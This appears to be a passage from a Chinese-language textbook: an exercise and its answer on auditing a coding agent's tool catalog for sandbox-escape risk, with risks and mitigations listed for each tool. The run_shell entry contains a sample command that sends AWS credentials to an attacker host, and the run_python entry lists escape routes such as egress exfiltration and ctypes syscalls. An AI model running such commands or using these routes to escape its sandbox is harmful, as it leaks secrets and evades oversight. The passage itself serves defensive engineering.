**Q6.** _审计工具目录的沙箱逃逸风险_。你的团队有以下内部编码助手 agent 的工具目录：`read_file(path)`、`write_file(path, content)`、`run_python(code)`、`run_shell(command)`、`git_commit(message)`、`git_push(branch)`、`search_web(query)`、`read_jira_ticket(ticket_id)`。审计此目录的沙箱逃逸风险。对每个风险工具，识别 (a) 具体风险和 (b) 工程缓解。在相关处交叉引用第 7 章的结构化输出纪律。

**答案：**

目录混合只读工具（低风险）、修改代码库的写工具（中风险）和代码执行工具（高风险）。高风险工具需要显式隔离；中风险工具需要范围化。

**read_file(path)**：如范围化则低风险。

* 风险：agent 读取项目外文件（`/etc/passwd`、`~/.aws/credentials`、父应用源码）。
* 缓解：对照允许列表根验证 `path`（例如 `path.startswith("/workspace/project")`）；拒绝任何带 `..` 遍历的路径；文件读取系统调用在无主机文件系统访问的沙箱容器中运行。

**write_file(path, content)**：中风险。

* 风险：同 read_file 加任意内容注入。agent 可向应用读取的文件写入恶意代码。
* 缓解：同 read_file 的路径范围化；此外，如内容有已知结构则 schema 验证（例如 JSON 配置文件按 schema 验证；第 7 章的结构化输出原则在此应用）。写在沙箱中进行；沙箱文件系统在轨迹结束时销毁。

**run_python(code)**：高风险；最大沙箱逃逸关注。

* 风险（按 §13.5）：通过出站网络数据渗出；通过写入共享卷持久妥协；资源耗尽；通过环境变量访问主机凭证；逃逸隔离的库导入（例如 `ctypes` 用于系统调用）。
* 缓解：E2B（或等价物）按调用沙箱。网络出站拒绝除非显式允许列表（仅 PyPI 用于安装）；资源上限（CPU、内存、墙上时钟）；每次调用后销毁的临时沙箱；不传入主机环境变量；不挂载主机卷。输出在返回 LLM 前截断和验证。

**run_shell(command)**：最高风险；可能不应存在。

* 风险：同 run_python 加更广泛系统访问（`curl http://attacker.com/$(cat ~/.aws/credentials)`）；比 Python 更难约束因为 shell 命令有无限表达力。
* 缓解：理想情况下，用 agent 实际需要的特定 shell 操作的特定工具替换（`run_tests()`、`lint_file(path)`、`format_file(path)`）。如确实需要，在与 run_python 相同的沙箱中运行，带更严格网络和文件系统隔离；允许列表特定命令；拒绝管道、重定向、命令替换；拒绝网络命令（curl、wget、ssh、nc）。每次调用记录完整命令用于审计。

**git_commit(message)**：中风险（对受跟踪仓库的写操作）。
